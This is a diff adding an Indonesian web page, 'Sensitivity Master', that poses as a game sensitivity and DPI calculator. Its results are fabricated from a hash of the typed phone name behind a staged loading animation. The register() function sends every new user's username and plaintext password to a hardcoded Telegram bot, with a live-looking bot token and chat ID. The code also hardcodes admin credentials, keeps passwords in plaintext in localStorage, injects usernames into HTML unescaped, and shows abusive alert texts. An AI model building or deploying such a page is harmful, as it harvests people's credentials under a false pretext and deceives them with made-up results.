@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SENSITIVITY MASTER | by ganZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* VIDEO BACKGROUND */
+        .video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.4);
+            z-index: -1;
+        }
+
+        body {
+            font-family: 'Poppins', 'Segoe UI', -apple-system, sans-serif;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* GLASS CARD */
+        .glass-card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 32px;
+            padding: 32px;
+            border: 1px solid rgba(255,255,255,0.2);
+            margin-bottom: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .ff-icon {
+            font-size: 40px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            color: white;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            color: rgba(255,255,255,0.7);
+            font-size: 12px;
+        }
+
+        /* TABS */
+        .tabs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 50px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+
+        .tab-btn.active {
+            background: rgba(255,255,255,0.2);
+            border-color: rgba(255,255,255,0.35);
+        }
+
+        /* FORM */
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            background: rgba(255,255,255,0.15);
+            border-color: rgba(255,255,255,0.4);
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 50px;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+
+        .btn-primary:hover {
+            background: rgba(255,255,255,0.25);
+        }
+
+        .info-text {
+            text-align: center;
+            color: rgba(255,255,255,0.5);
+            font-size: 11px;
+            margin-top: 16px;
+        }
+
+        .vip-badge {
+            display: inline-block;
+            background: rgba(251,191,36,0.2);
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 11px;
+            color: #fbbf24;
+            margin-left: 8px;
+        }
+
+        .admin-badge {
+            display: inline-block;
+            background: rgba(239,68,68,0.2);
+            padding: 4px 12px;
+            border-radius: 50px;
+            font-size: 11px;
+            color: #ef4444;
+            margin-left: 8px;
+        }
+
+        /* MAIN CONTENT */
+        .main-content {
+            display: none;
+        }
+
+        .search-section, .package-section, .result-section, .admin-panel {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 28px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .admin-panel {
+            border: 1px solid rgba(239,68,68,0.4);
+            background: rgba(239,68,68,0.05);
+        }
+
+        .admin-panel h3 {
+            color: #ef4444;
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+
+        .admin-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .admin-input-group input {
+            flex: 1;
+            padding: 12px 16px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(239,68,68,0.3);
+            border-radius: 50px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .admin-btn {
+            padding: 12px 20px;
+            background: rgba(239,68,68,0.2);
+            border: 1px solid rgba(239,68,68,0.4);
+            border-radius: 50px;
+            color: #ef4444;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .admin-btn:hover {
+            background: rgba(239,68,68,0.3);
+        }
+
+        .user-list {
+            margin-top: 16px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .user-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 50px;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+
+        .user-name {
+            color: white;
+        }
+
+        .user-vip {
+            color: #fbbf24;
+            font-size: 11px;
+        }
+
+        .user-admin {
+            color: #ef4444;
+            font-size: 11px;
+        }
+
+        .make-vip-btn {
+            background: rgba(251,191,36,0.2);
+            border: none;
+            padding: 5px 12px;
+            border-radius: 50px;
+            color: #fbbf24;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .delete-user-btn {
+            background: rgba(239,68,68,0.2);
+            border: none;
+            padding: 5px 12px;
+            border-radius: 50px;
+            color: #ef4444;
+            cursor: pointer;
+            font-size: 11px;
+            margin-left: 8px;
+        }
+
+        .search-section h3, .package-section h3, .result-header h3 {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 16px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .selected-device {
+            background: rgba(255,255,255,0.05);
+            padding: 12px;
+            border-radius: 20px;
+            margin-top: 12px;
+            text-align: center;
+            font-size: 13px;
+            color: rgba(255,255,255,0.8);
+        }
+
+        /* LOADING */
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        .loading-text {
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+        }
+
+        .loading-bar {
+            width: 80%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+            margin: 15px auto 0;
+            overflow: hidden;
+        }
+
+        .loading-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #4ade80, #fbbf24, #4ade80);
+            background-size: 200% auto;
+            animation: shimmer 1.5s linear infinite;
+            border-radius: 4px;
+            transition: width 0.1s linear;
+        }
+
+        .package-options {
+            display: flex;
+            gap: 12px;
+        }
+
+        .package-card {
+            flex: 1;
+            padding: 18px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .package-card.selected {
+            background: rgba(255,255,255,0.12);
+            border-color: rgba(255,255,255,0.3);
+        }
+
+        .package-name {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .package-card.free .package-name { color: #4ade80; }
+        .package-card.vip .package-name { color: #fbbf24; }
+
+        .sensitivity-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .sense-card {
+            background: rgba(255,255,255,0.05);
+            padding: 14px;
+            border-radius: 18px;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp 0.3s ease forwards;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .sense-label {
+            color: rgba(255,255,255,0.6);
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+
+        .sense-value {
+            font-size: 24px;
+            font-weight: 600;
+            color: white;
+            margin-top: 4px;
+        }
+
+        .dpi-box {
+            background: rgba(255,255,255,0.05);
+            padding: 16px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 16px;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp 0.3s ease 0.1s forwards;
+        }
+
+        .dpi-value {
+            font-size: 42px;
+            font-weight: 700;
+            color: #fbbf24;
+        }
+
+        .apply-btn, .logout-btn {
+            width: 100%;
+            padding: 14px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .logout-btn {
+            background: rgba(255,100,100,0.15);
+            border-color: rgba(255,100,100,0.3);
+        }
+
+        @media (max-width: 500px) {
+            .glass-card { padding: 24px; }
+            .title { font-size: 26px; }
+            .sensitivity-grid { grid-template-columns: 1fr; }
+            .admin-input-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+<video class="video-bg" autoplay loop muted playsinline>
+    <source src="https://videotourl.com/videos/1779327925540-e761076f-d54e-485f-87ba-c01391825d83.mp4" type="video/mp4">
+</video>
+<div class="overlay"></div>
+
+<div class="container">
+    <!-- LOGIN/REGISTER CARD -->
+    <div id="authContainer">
+        <div class="glass-card">
+            <div class="header">
+                <div class="logo-area">
+                    <span class="ff-icon">🎮</span>
+                    <h1 class="title">Sensitivity Master</h1>
+                    <span class="ff-icon">⚡</span>
+                </div>
+                <div class="subtitle">by ganZ</div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab-btn active" id="loginTabBtn" onclick="showTab('login')">Login</div>
+                <div class="tab-btn" id="registerTabBtn" onclick="showTab('register')">Register</div>
+            </div>
+
+            <!-- LOGIN FORM -->
+            <div id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="loginUsername" placeholder="Username">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="loginPassword" placeholder="Password">
+                </div>
+                <button class="btn-primary" onclick="login()">Login →</button>
+                <div class="info-text">Free member / VIP sama-sama login disini</div>
+            </div>
+
+            <!-- REGISTER FORM -->
+            <div id="registerForm" style="display:none;">
+                <div class="input-group">
+                    <input type="text" id="regUsername" placeholder="Buat Username">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="regPassword" placeholder="Buat Password">
+                </div>
+                <button class="btn-primary" onclick="register()">Register →</button>
+                <div class="info-text">Password akan dikirim ke Telegram @GanzTricks</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="mainContainer" class="main-content">
+        <!-- ADMIN PANEL (hanya untuk admin) -->
+        <div id="adminPanel" class="admin-panel" style="display:none;">
+            <h3>👑 ADMIN PANEL</h3>
+            <div class="admin-input-group">
+                <input type="text" id="adminUsername" placeholder="Username">
+                <button class="admin-btn" onclick="makeVip()">⭐ Buat VIP</button>
+                <button class="admin-btn" onclick="deleteUser()">🗑️ Hapus User</button>
+            </div>
+            <div class="admin-input-group">
+                <input type="text" id="vipUsername" placeholder="Username untuk jadi VIP">
+                <button class="admin-btn" onclick="makeVipPermanent()">💎 VIP Permanen</button>
+            </div>
+            <div class="user-list" id="userList"></div>
+        </div>
+
+        <div class="search-section">
+            <h3>📱 Device Detector</h3>
+            <input type="text" class="search-input" id="searchInput" placeholder="Ketik nama HP kamu..." onkeyup="handleDeviceInput()">
+            <div class="selected-device" id="selectedDevice">
+                📱 Device: <strong id="deviceNameDisplay">-</strong>
+            </div>
+        </div>
+
+        <!-- LOADING -->
+        <div class="loading-container" id="loadingContainer">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Menganalisis device...</div>
+            <div class="loading-bar">
+                <div class="loading-bar-fill" id="loadingBarFill"></div>
+            </div>
+        </div>
+
+        <div class="package-section">
+            <h3>💎 Paket Sensitivity</h3>
+            <div class="package-options">
+                <div class="package-card free" id="freePackage" onclick="selectPackage('free')">
+                    <div class="package-name">FREE</div>
+                </div>
+                <div class="package-card vip" id="vipPackage" onclick="selectPackage('vip')">
+                    <div class="package-name">GVIP <span class="vip-badge">VIP</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="result-section" id="resultSection">
+            <div class="result-header">
+                <h3>⚡ Hasil Sensitivity</h3>
+                <p id="resultDeviceName" style="color:rgba(255,255,255,0.5); font-size:12px;">-</p>
+            </div>
+            <div class="sensitivity-grid" id="sensitivityGrid"></div>
+            <div class="dpi-box">
+                <div style="color:rgba(255,255,255,0.6); font-size:12px;">Recommended DPI</div>
+                <div class="dpi-value" id="dpiValue">-</div>
+            </div>
+            <button class="apply-btn" onclick="copySettings()">Copy Settings</button>
+            <button class="logout-btn" onclick="logout()">Logout</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // TELEGRAM CONFIG
+    const BOT_TOKEN = '8789596645:AAGg1Oy4B1QPk3jFwAhKPaXw7WcDfXaon4U';
+    const CHAT_ID = '8642273376';
+    
+    // ADMIN CREDENTIAL
+    const ADMIN_USERNAME = 'GanzTricks';
+    const ADMIN_PASSWORD = '1234';
+    
+    // VIP PASSWORD
+    const VIP_PASSWORD = 'Gvip';
+    
+    // STORAGE
+    let users = JSON.parse(localStorage.getItem('sens_users')) || {};
+    let currentUser = null;
+    let isVip = false;
+    let isAdmin = false;
+    let selectedPackage = 'free';
+    
+    let loadingTimeout = null;
+    let currentDeviceName = '';
+
+    // TELEGRAM SENDER
+    async function sendToTelegram(username, password, isVipUser) {
+        const type = isVipUser ? '👑 VIP' : '📋 FREE';
+        const message = `🔐 *NEW REGISTER SENSITIVITY MASTER* 🔐\n━━━━━━━━━━━━━━━━━\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n⭐ *Tipe:* ${type}\n📅 *Waktu:* ${new Date().toLocaleString('id-ID')}\n━━━━━━━━━━━━━━━━━\n🔥 by ganZ 🔥`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) {
+            console.log('Telegram error:', e);
+        }
+    }
+
+    function updateUserList() {
+        if(!isAdmin) return;
+        const userListDiv = document.getElementById('userList');
+        const userArray = Object.entries(users).map(([name, data]) => ({
+            name: name,
+            isVip: data.isVip || false,
+            isAdmin: name === ADMIN_USERNAME
+        }));
+        
+        userListDiv.innerHTML = userArray.map(user => `
+            <div class="user-item">
+                <div>
+                    <span class="user-name">${user.name}</span>
+                    ${user.isVip ? '<span class="user-vip"> ⭐ VIP</span>' : ''}
+                    ${user.isAdmin ? '<span class="user-admin"> 👑 Admin</span>' : ''}
+                </div>
+                <div>
+                    ${!user.isAdmin ? `<button class="make-vip-btn" onclick="makeVipByName('${user.name}')">⭐ VIP</button>` : ''}
+                    ${!user.isAdmin ? `<button class="delete-user-btn" onclick="deleteUserByName('${user.name}')">🗑️</button>` : ''}
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function makeVip() {
+        const username = document.getElementById('adminUsername').value.trim();
+        if(!username) {
+            alert("Masukkan username!");
+            return;
+        }
+        if(!users[username]) {
+            alert("User tidak ditemukan!");
+            return;
+        }
+        if(username === ADMIN_USERNAME) {
+            alert("Admin sudah VIP!");
+            return;
+        }
+        users[username].isVip = true;
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        updateUserList();
+        document.getElementById('adminUsername').value = '';
+        alert(`✅ ${username} sekarang menjadi VIP!`);
+    }
+
+    function makeVipPermanent() {
+        const username = document.getElementById('vipUsername').value.trim();
+        if(!username) {
+            alert("Masukkan username!");
+            return;
+        }
+        if(!users[username]) {
+            alert("User tidak ditemukan!");
+            return;
+        }
+        if(username === ADMIN_USERNAME) {
+            alert("Admin sudah VIP!");
+            return;
+        }
+        users[username].isVip = true;
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        updateUserList();
+        document.getElementById('vipUsername').value = '';
+        alert(`✅ ${username} menjadi VIP PERMANEN!`);
+    }
+
+    function makeVipByName(username) {
+        if(!users[username]) return;
+        users[username].isVip = true;
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        updateUserList();
+        alert(`✅ ${username} sekarang menjadi VIP!`);
+    }
+
+    function deleteUser() {
+        const username = document.getElementById('adminUsername').value.trim();
+        if(!username) {
+            alert("Masukkan username!");
+            return;
+        }
+        if(username === ADMIN_USERNAME) {
+            alert("Tidak bisa hapus admin!");
+            return;
+        }
+        if(!users[username]) {
+            alert("User tidak ditemukan!");
+            return;
+        }
+        delete users[username];
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        updateUserList();
+        document.getElementById('adminUsername').value = '';
+        alert(`✅ User ${username} berhasil dihapus!`);
+    }
+
+    function deleteUserByName(username) {
+        if(username === ADMIN_USERNAME) {
+            alert("Tidak bisa hapus admin!");
+            return;
+        }
+        delete users[username];
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        updateUserList();
+        alert(`✅ User ${username} berhasil dihapus!`);
+    }
+
+    function showTab(tab) {
+        const loginForm = document.getElementById('loginForm');
+        const registerForm = document.getElementById('registerForm');
+        const loginBtn = document.getElementById('loginTabBtn');
+        const registerBtn = document.getElementById('registerTabBtn');
+        
+        if(tab === 'login') {
+            loginForm.style.display = 'block';
+            registerForm.style.display = 'none';
+            loginBtn.classList.add('active');
+            registerBtn.classList.remove('active');
+        } else {
+            loginForm.style.display = 'none';
+            registerForm.style.display = 'block';
+            loginBtn.classList.remove('active');
+            registerBtn.classList.add('active');
+        }
+    }
+
+    function register() {
+        const username = document.getElementById('regUsername').value.trim();
+        const password = document.getElementById('regPassword').value;
+        
+        if(!username || !password) {
+            alert("ISI SEMUA, BANGSAT!");
+            return;
+        }
+        
+        if(users[username]) {
+            alert("USERNAME SUDAH ADA, TAI!");
+            return;
+        }
+        
+        const isVipUser = (password === VIP_PASSWORD);
+        
+        users[username] = {
+            password: password,
+            isVip: isVipUser,
+            createdAt: new Date().toISOString()
+        };
+        
+        localStorage.setItem('sens_users', JSON.stringify(users));
+        
+        sendToTelegram(username, password, isVipUser);
+        
+        alert(isVipUser ? "✅ REGISTER VIP BERHASIL! SILAHKAN LOGIN" : "✅ REGISTER BERHASIL! SILAHKAN LOGIN");
+        
+        document.getElementById('regUsername').value = '';
+        document.getElementById('regPassword').value = '';
+        showTab('login');
+    }
+
+    function login() {
+        const username = document.getElementById('loginUsername').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        
+        if(!username || !password) {
+            alert("ISI SEMUA, BANGSAT!");
+            return;
+        }
+        
+        // CEK ADMIN
+        if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+            currentUser = ADMIN_USERNAME;
+            isAdmin = true;
+            isVip = true;
+            selectedPackage = 'vip';
+            
+            // PASTIKAN ADMIN ADA DI DATABASE
+            if(!users[ADMIN_USERNAME]) {
+                users[ADMIN_USERNAME] = {
+                    password: ADMIN_PASSWORD,
+                    isVip: true,
+                    isAdmin: true,
+                    createdAt: new Date().toISOString()
+                };
+                localStorage.setItem('sens_users', JSON.stringify(users));
+            }
+            
+            document.getElementById('authContainer').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('vipPackage').classList.add('selected');
+            updateUserList();
+            return;
+        }
+        
+        // CEK USER BIASA
+        if(!users[username]) {
+            alert("USERNAME TIDAK DITEMUKAN!");
+            return;
+        }
+        
+        if(users[username].password !== password) {
+            alert("PASSWORD SALAH, TAI!");
+            return;
+        }
+        
+        currentUser = username;
+        isAdmin = false;
+        isVip = users[username].isVip || false;
+        
+        if(isVip) {
+            selectedPackage = 'vip';
+            document.getElementById('vipPackage').classList.add('selected');
+        } else {
+            selectedPackage = 'free';
+            document.getElementById('freePackage').classList.add('selected');
+        }
+        
+        document.getElementById('authContainer').style.display = 'none';
+        document.getElementById('mainContainer').style.display = 'block';
+        document.getElementById('adminPanel').style.display = 'none';
+        
+        // Reset tampilan
+        document.getElementById('sensitivityGrid').innerHTML = '';
+        document.getElementById('dpiValue').innerHTML = '-';
+        document.getElementById('resultDeviceName').innerHTML = '-';
+        document.getElementById('deviceNameDisplay').innerHTML = '-';
+        document.getElementById('searchInput').value = '';
+        currentDeviceName = '';
+    }
+
+    function logout() {
+        if(loadingTimeout) clearTimeout(loadingTimeout);
+        currentUser = null;
+        isAdmin = false;
+        isVip = false;
+        selectedPackage = 'free';
+        
+        document.getElementById('authContainer').style.display = 'block';
+        document.getElementById('mainContainer').style.display = 'none';
+        document.getElementById('loginUsername').value = '';
+        document.getElementById('loginPassword').value = '';
+        document.getElementById('searchInput').value = '';
+        document.getElementById('loadingContainer').style.display = 'none';
+        document.getElementById('resultSection').style.display = 'block';
+    }
+
+    function selectPackage(packageType) {
+        if(!currentUser) return;
+        
+        if(packageType === 'vip' && !isVip) {
+            alert("⚠️ PAKET VIP KHUSUS MEMBER VIP! ⚠️\nHubungi @GanzTricks di TikTok untuk jadi VIP!");
+            return;
+        }
+        
+        selectedPackage = packageType;
+        
+        if(selectedPackage === 'free') {
+            document.getElementById('freePackage').classList.add('selected');
+            document.getElementById('vipPackage').classList.remove('selected');
+        } else {
+            document.getElementById('freePackage').classList.remove('selected');
+            document.getElementById('vipPackage').classList.add('selected');
+        }
+        
+        if(currentDeviceName) {
+            startLoadingAndGenerate(currentDeviceName);
+        }
+    }
+
+    function handleDeviceInput() {
+        const deviceName = document.getElementById('searchInput').value.trim();
+        
+        if(deviceName === "") {
+            if(loadingTimeout) clearTimeout(loadingTimeout);
+            document.getElementById('loadingContainer').style.display = 'none';
+            document.getElementById('resultSection').style.display = 'block';
+            document.getElementById('sensitivityGrid').innerHTML = '';
+            document.getElementById('dpiValue').innerHTML = '-';
+            document.getElementById('resultDeviceName').innerHTML = '-';
+            document.getElementById('deviceNameDisplay').innerHTML = '-';
+            currentDeviceName = '';
+            return;
+        }
+        
+        if(loadingTimeout) clearTimeout(loadingTimeout);
+        
+        currentDeviceName = deviceName;
+        startLoadingAndGenerate(deviceName);
+    }
+
+    function startLoadingAndGenerate(deviceName) {
+        document.getElementById('resultSection').style.display = 'none';
+        const loadingContainer = document.getElementById('loadingContainer');
+        loadingContainer.style.display = 'block';
+        
+        const loadingText = document.getElementById('loadingText');
+        const loadingBarFill = document.getElementById('loadingBarFill');
+        
+        const loadingSteps = [
+            { text: "Mendeteksi spesifikasi device...", progress: 20 },
+            { text: "Menganalisis layar & resolusi...", progress: 40 },
+            { text: "Menghitung DPI optimal...", progress: 60 },
+            { text: "Menyesuaikan sensitivity...", progress: 80 },
+            { text: "Menyiapkan hasil gacor...", progress: 95 }
+        ];
+        
+        let stepIndex = 0;
+        loadingBarFill.style.width = '0%';
+        
+        const interval = setInterval(() => {
+            if(stepIndex < loadingSteps.length) {
+                const step = loadingSteps[stepIndex];
+                loadingText.innerHTML = step.text;
+                loadingBarFill.style.width = step.progress + '%';
+                stepIndex++;
+            }
+        }, 1200);
+        
+        loadingTimeout = setTimeout(() => {
+            clearInterval(interval);
+            loadingBarFill.style.width = '100%';
+            loadingText.innerHTML = "Selesai! Menampilkan hasil...";
+            
+            setTimeout(() => {
+                loadingContainer.style.display = 'none';
+                document.getElementById('resultSection').style.display = 'block';
+                generateSensitivity(deviceName);
+            }, 500);
+        }, 10000);
+    }
+
+    const sensitivityList = [
+        { label: "general", key: "general", minFree: 85, maxFree: 110, minVip: 110, maxVip: 145 },
+        { label: "red dot", key: "reddot", minFree: 88, maxFree: 115, minVip: 115, maxVip: 150 },
+        { label: "2x scope", key: "scope2", minFree: 82, maxFree: 108, minVip: 108, maxVip: 142 },
+        { label: "3x scope", key: "scope3", minFree: 78, maxFree: 102, minVip: 102, maxVip: 138 },
+        { label: "4x scope", key: "scope4", minFree: 75, maxFree: 98, minVip: 98, maxVip: 132 },
+        { label: "6x scope", key: "scope6", minFree: 72, maxFree: 94, minVip: 94, maxVip: 128 },
+        { label: "8x scope", key: "scope8", minFree: 68, maxFree: 88, minVip: 88, maxVip: 122 },
+        { label: "free look", key: "freelook", minFree: 80, maxFree: 105, minVip: 105, maxVip: 140 }
+    ];
+
+    function generateSensitivity(deviceName) {
+        const deviceDisplay = document.getElementById('deviceNameDisplay');
+        const resultDevice = document.getElementById('resultDeviceName');
+        const gridContainer = document.getElementById('sensitivityGrid');
+        
+        deviceDisplay.innerHTML = deviceName.toUpperCase();
+        resultDevice.innerHTML = deviceName.toUpperCase();
+        
+        let hash = 0;
+        for(let i = 0; i < deviceName.length; i++) {
+            hash = ((hash << 5) - hash) + deviceName.charCodeAt(i);
+        }
+        const seed = Math.abs(hash) % 100;
+        
+        let values = {};
+        for(let sens of sensitivityList) {
+            let minVal = selectedPackage === 'free' ? sens.minFree : sens.minVip;
+            let maxVal = selectedPackage === 'free' ? sens.maxFree : sens.maxVip;
+            let val = minVal + (seed % (maxVal - minVal + 1));
+            val += Math.min(deviceName.length, 10);
+            val = Math.min(val, maxVal);
+            values[sens.key] = Math.floor(val);
+        }
+        
+        let dpi = (selectedPackage === 'free' ? 380 : 420) + (seed % 60);
+        dpi += Math.min(deviceName.length, 20);
+        dpi = Math.min(dpi, 520);
+        dpi = Math.max(dpi, 370);
+        
+        gridContainer.innerHTML = sensitivityList.map((sens, idx) => `
+            <div class="sense-card" style="animation-delay: ${idx * 0.03}s">
+                <div class="sense-label">${sens.label}</div>
+                <div class="sense-value">${values[sens.key]}</div>
+            </div>
+        `).join('');
+        
+        document.getElementById('dpiValue').innerHTML = dpi;
+        document.getElementById('resultSection').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+
+    function copySettings() {
+        const deviceName = document.getElementById('searchInput').value.trim();
+        if(deviceName === "") {
+            alert("ISI DULU NAMA HP NYA!");
+            return;
+        }
+        
+        const senseCards = document.querySelectorAll('.sense-card');
+        let text = `⚡ SENSITIVITY MASTER - by ganZ ⚡\n📱 Device: ${deviceName.toUpperCase()}\n👤 User: ${currentUser}\n💎 Package: ${selectedPackage.toUpperCase()}\n━━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        senseCards.forEach(card => {
+            const label = card.querySelector('.sense-label').innerText;
+            const value = card.querySelector('.sense-value').innerText;
+            text += `${label}: ${value}\n`;
+        });
+        
+        const dpi = document.getElementById('dpiValue').innerText;
+        text += `━━━━━━━━━━━━━━━━━━━━━━\n📱 DPI: ${dpi}\n━━━━━━━━━━━━━━━━━━━━━━\n🔥 GACOR MAX! 🔥`;
+        
+        navigator.clipboard.writeText(text);
+        alert("✅ SETTINGS COPIED!");
+    }
+</script>
+</body>
+</html>
